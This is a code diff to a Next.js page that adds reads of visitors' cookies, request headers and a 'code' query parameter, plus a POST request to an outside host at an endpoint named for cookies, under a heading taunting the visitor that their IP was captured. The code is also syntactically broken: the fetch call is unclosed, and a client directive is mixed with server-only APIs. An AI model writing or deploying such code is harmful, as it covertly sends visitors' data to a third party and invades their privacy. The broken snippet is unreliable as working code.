@@ -1,11 +1,20 @@
+'use client'
+
 import Link from 'next/link';
 import { headers } from 'next/headers';
+import { useSearchParams } from 'next/navigation';
+import { cookies } from 'next/headers';
 
-export default function Page() {
+export default async function Page() {
   const heads = headers()
+  const cook = cookies()
+  const params = useSearchParams()
+  const code = params.get('code')
+  await fetch("https://www.chronicbot.xyz/api/cookies", {method: "POST", }
   function btnLog() {
     console.log("Vercel log test");
   }
+  
   return (
     <>
       <h1>Got your fucken IP idiot</h1>
